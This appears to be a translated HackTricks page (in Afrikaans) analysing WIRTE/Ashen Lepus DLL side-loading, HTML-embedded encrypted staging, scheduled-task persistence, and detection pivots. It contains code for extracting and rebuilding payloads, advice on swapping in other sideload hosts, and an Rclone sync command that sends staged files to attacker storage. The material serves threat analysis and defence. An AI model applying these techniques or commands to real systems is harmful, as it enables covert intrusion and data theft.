# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Oorsig

Ashen Lepus (ook bekend as WIRTE) het 'n herhaalbare patroon gewapen wat DLL sideloading, staged HTML payloads en modulêre .NET backdoors kombineer om binne Midde-Oosterse diplomatieke netwerke te persisteer. Die tegniek is herbruikbaar deur enige operator omdat dit op die volgende staatmaak:<sup>[[1]](#references)</sup>

- **Argiefgebaseerde social engineering**: onskadelike PDF's instrueer teikens om 'n RAR-argief vanaf 'n file-sharing-webwerf af te laai. Die argief bevat 'n realisties lykende document viewer EXE, 'n malicious DLL vernoem na 'n trusted library (bv. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), en 'n lokmiddel-`Document.pdf`.
- **Misbruik van DLL-soekvolgorde**: die slagoffer dubbelklik op die EXE, Windows los die DLL-import vanuit die huidige gids op, en die malicious loader (AshenLoader) voer binne die trusted process uit terwyl die lokmiddel-PDF oopmaak om agterdog te vermy.
- **Living-off-the-land staging**: elke latere stage (AshenStager → AshenOrchestrator → modules) word van die skyf af gehou totdat dit benodig word, en word as encrypted blobs gelewer wat binne andersins onskadelike HTML-responses versteek is.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: die EXE side-load AshenLoader, wat host recon uitvoer, dit met AES-CTR encrypt, en dit binne roterende parameters soos `token=`, `id=`, `q=`, of `auth=` POST na API-agtige paths (bv. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **HTML extraction**: die C2 verraai die volgende stage slegs wanneer die client-IP na die teikenstreek geolocateer word en die `User-Agent` met die implant ooreenstem, wat sandboxes frustreer. Wanneer die checks slaag, bevat die HTTP-body 'n `<headerp>...</headerp>`-blob met die Base64/AES-CTR encrypted AshenStager-payload.
3. **Second sideload**: AshenStager word met 'n ander legitimate binary ontplooi wat `wtsapi32.dll` importeer. Die malicious copy wat in die binary geïnjecteer is, fetch meer HTML, en sny hierdie keer `<article>...</article>` uit om AshenOrchestrator te herwin.
4. **AshenOrchestrator**: 'n modulêre .NET-controller wat 'n Base64 JSON-config decodeer. Die config se `tg`- en `au`-velde word aaneengeskakel/gehash om die AES-key te vorm, wat `xrk` decrypt. Die resulterende bytes tree op as 'n XOR-key vir elke module-blob wat daarna gefetch word.
5. **Module delivery**: elke module word deur HTML-comments beskryf wat die parser na 'n arbitrêre tag herlei, wat static rules breek wat slegs vir `<headerp>` of `<article>` soek. Modules sluit persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), en file exploration (`FE`) in.

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selfs al blokkeer of verwyder verdedigers ’n spesifieke element, hoef die operateur slegs die merker waarna in die HTML-kommentaar verwys word, te verander om aflewering te hervat.<sup>[[1]](#references)</sup>

### Vinnige ekstraksiehulpmiddel (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Onlangse HTML smuggling-navorsing (Talos) beklemtoon payloads wat as Base64-stringe binne `<script>`-blokke in HTML-aanhegsels versteek word en tydens runtime deur JavaScript gedekodeer word.<sup>[[2]](#references)</sup> Dieselfde truuk kan vir C2-antwoorde hergebruik word: stage encrypted blobs binne 'n script tag (of ander DOM-element) en dekodeer hulle in-memory vóór AES/XOR, sodat die bladsy soos gewone HTML lyk. Talos wys ook gelaagde obfuscation (identifier-hernoeming plus Base64/Caesar/AES) binne script tags, wat goed ooreenstem met HTML-staged C2 blobs.<sup>[[2]](#references)</sup> 'n Latere Talos-skrywe oor **hidden text salting** is ook hier relevant: om Base64 met irrelevante HTML-kommentaar of whitespace te verdeel, is genoeg om eenvoudige regex extractors te breek, terwyl browser-side reconstruction eenvoudig bly.<sup>[[7]](#references)</sup>

## Onlangse Variant Notes (2024-2025)

- Check Point het in 2024 WIRTE-campaigns waargeneem wat steeds op archive-based sideloading gesteun het, maar `propsys.dll` (stagerx64) as die eerste stage gebruik het. Die stager dekodeer die volgende payload met Base64 + XOR (key `53`), stuur HTTP requests met 'n hardcoded `User-Agent`, en haal encrypted blobs uit wat tussen HTML tags ingebed is. In een vertakking is die stage gerekonstrueer uit 'n lang lys ingebedde IP-stringe wat met `RtlIpv4StringToAddressA` gedekodeer is, en daarna in die payload bytes aaneengeskakel is.<sup>[[3]](#references)</sup>
- OWN-CERT het vroeëre WIRTE-tooling gedokumenteer waar die side-loaded `wtsapi32.dll` dropper strings met Base64 + TEA beskerm het en die DLL-naam self as die encryption key gebruik het; daarna is host-identification data met XOR/Base64 ge-obfuskeer voordat dit na die C2 gestuur is.<sup>[[4]](#references)</sup>

## Rekonstruksie van IP-Encoded Stages

WIRTE se 2024 `propsys.dll`-vertakking wys dat die volgende PE nie as een aaneenlopende HTML blob hoef te bestaan nie. Die loader kan stage bytes as dotted-quad strings stoor en dit met `RtlIpv4StringToAddressA` herbou, 'n patroon wat nou verwant is aan Hive se **IPfuscation**-tradecraft.<sup>[[3]](#references)[[5]](#references)</sup> Operasioneel is dit nuttig wanneer die actor wil hê dat die HTML-bladsy iets moet bevat wat soos onskadelike IOCs of config data lyk, eerder as 'n ooglopende Base64 payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
As die herstelde grepe met `MZ` begin, het jy waarskynlik die volgende PE direk gerekonstrueer. Indien nie, kyk vir ’n voorafgaande XOR/Base64-laag of klein skeidingsgrepe tussen adresse.

## Uitruilbare DLL-name & Host-rotasie

’n Sterk eienskap van hierdie patroon is dat die **HTML/AES/XOR-staging-backend identies kan bly terwyl slegs die sideload-paar verander**. WIRTE het tussen `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` en `propsys.dll` oor veldtogte heen gewissel, wat nuttig is omdat:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` en `wtsapi32.dll` is onopvallende Windows DLL-name wat verdedigers verwag om in `%System32%` / `%SysWOW64%` te bestaan.
- Publieke katalogusse soos **HijackLibs** karteer reeds baie binaries wat daardie DLL-name vanaf ’n gekopieerde toepassingsgids sal laai, wat operators vervangingshosts bied sonder om die stager te herontwerp.
- Slegs die export-oppervlak moet per host aangepas word. Die HTML-parser, AES/XOR-roetines en module loader kan gewoonlik onveranderd na ’n forwarding proxy DLL oorgedra word.

Vir offensiewe laboratoriumwerk beteken dit dat jy die probleem in **(1) vind ’n stabiele, getekende host wat jou gekose DLL-name plaaslik resolveer** en **(2) hergebruik dieselfde staged-HTML-loaderlogika agter daardie DLL** kan verdeel.

## Crypto & C2-verharding

- **AES-CTR oral**: huidige loaders bevat 256-bis-sleutels plus nonces (bv. `{9a 20 51 98 ...}`) en voeg opsioneel ’n XOR-laag by met strings soos `msasn1.dll` voor/na dekripsie.<sup>[[1]](#references)</sup>
- **Variasies in key material**: vroeëre loaders het Base64 + TEA gebruik om ingebedde strings te beskerm, met die dekripsiesleutel afgelei van die kwaadwillige DLL-name (bv. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Infrastruktuurverdeling + subdomein-camouflage**: staging-bedieners word per tool geskei, oor wisselende ASNs gehuisves en soms deur wettig lykende subdomeine gefront, sodat die kompromittering van een stage nie die res blootlê nie.
- **Recon-smokkelary**: geënumeerde data sluit nou Program Files-lyste in om waardevolle toepassings raak te sien, en word altyd geënkripteer voordat dit die host verlaat.
- **URI-wisseling**: query parameters en REST-paaie wissel tussen veldtogte (`/api/v1/account?token=` → `/api/v2/account?auth=`), wat brose detections ongeldig maak.
- **User-Agent-pinning + veilige redirects**: C2-infrastruktuur reageer slegs op presiese UA-strings en redirect andersins na welwillende nuus-/gesondheidswerwe om daarin op te gaan.
- **Gated delivery**: bedieners is geo-fenced en antwoord slegs aan regte implants. Ongemagtigde clients ontvang onskadelike HTML.

## Persistence & Execution Loop

AshenStager laat scheduled tasks val wat hulle as Windows-onderhoudstake voordoen en via `svchost.exe` uitvoer, bv.:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Hierdie tasks begin die sideloading chain weer tydens boot of met tussenposes, wat verseker dat AshenOrchestrator vars modules kan aanvra sonder om weer aan die skyf te raak.

## Using Benign Sync Clients for Exfiltration

Operators plaas diplomatieke dokumente in `C:\Users\Public` (wêreldleesbaar en nie verdag nie) deur ’n toegewyde module, en laai dan die wettige [Rclone](https://rclone.org/)-binary af om daardie gids met attacker storage te sinkroniseer. Unit42 merk op dat dit die eerste keer is wat hierdie actor waargeneem is terwyl Rclone vir exfiltration gebruik word, in ooreenstemming met die breër tendens om wettige sync tooling te misbruik om in normale verkeer op te gaan:<sup>[[1]](#references)</sup>

1. **Stage**: kopieer/versamel teikenlêers in `C:\Users\Public\{campaign}\`.
2. **Configure**: stuur ’n Rclone-config wat na ’n attacker-beheerde HTTPS-endpoint wys (bv. `api.technology-system[.]com`).
3. **Sync**: voer `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` uit sodat die verkeer soos normale cloud backups lyk.

Omdat Rclone wyd vir wettige backup-workflows gebruik word, moet verdedigers op anomale executions fokus (nuwe binaries, vreemde remotes of skielike syncing van `C:\Users\Public`).

## Detection Pivots

- Waarsku oor **signed processes** wat onverwags DLLs vanaf user-writable paths laai (Procmon-filters + `Get-ProcessMitigation -Module`), veral wanneer die DLL-name met `netutils`, `srvcli`, `dwampi`, `wtsapi32` of `propsys` ooreenstem.<sup>[[6]](#references)</sup>
- Ondersoek verdagte HTTPS-responses vir **groot Base64-blobs wat binne ongewone tags ingebed is** of deur `<!-- TAG: <xyz> -->`-comments beskerm word.
- Normaliseer HTML eers: **verwyder comments en vou whitespace saam voor Base64-extraction**, omdat hidden-text-salting-styl-evasion payloads oor comment boundaries kan verdeel.
- Brei HTML-hunting uit na **Base64-strings binne `<script>`-blocks** (HTML-smuggling-styl staging) wat deur JavaScript gedecodeer word voordat AES/XOR-verwerking plaasvind.
- Hunt vir herhaalde calls na **`RtlIpv4StringToAddressA` gevolg deur buffer assembly**, veral wanneer die omliggende strings lang IPv4-lyste eerder as werklike network targets is.
- Hunt vir **scheduled tasks** wat `svchost.exe` met nie-service arguments uitvoer of na dropper directories terugwys.
- Track **C2 redirects** wat slegs payloads vir presiese `User-Agent`-strings terugstuur en andersins na wettige nuus-/gesondheidsdomeine bounce.
- Monitor vir **Rclone**-binaries wat buite IT-bestuurde liggings verskyn, nuwe `rclone.conf`-lêers of sync jobs wat vanaf staging directories soos `C:\Users\Public` trek.

## Verwysings

- [1] [Hamas-geaffilieerde Ashen Lepus teiken Midde-Oosterse diplomatieke entiteite met nuwe AshTag-malware suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Versteek tussen die tags: Insigte in evasion-tegnieke in HTML-smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-geaffilieerde threat actor WIRTE sit sy Midde-Ooste-operasies voort en beweeg na disruptive activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: Op soek na verlore tyd](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware ontplooi nuwe IPfuscation-tegniek om detection te vermy](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potensiële System DLL-sideloading vanaf nie-System-liggings](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Geur e-pos threats met hidden-text-salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
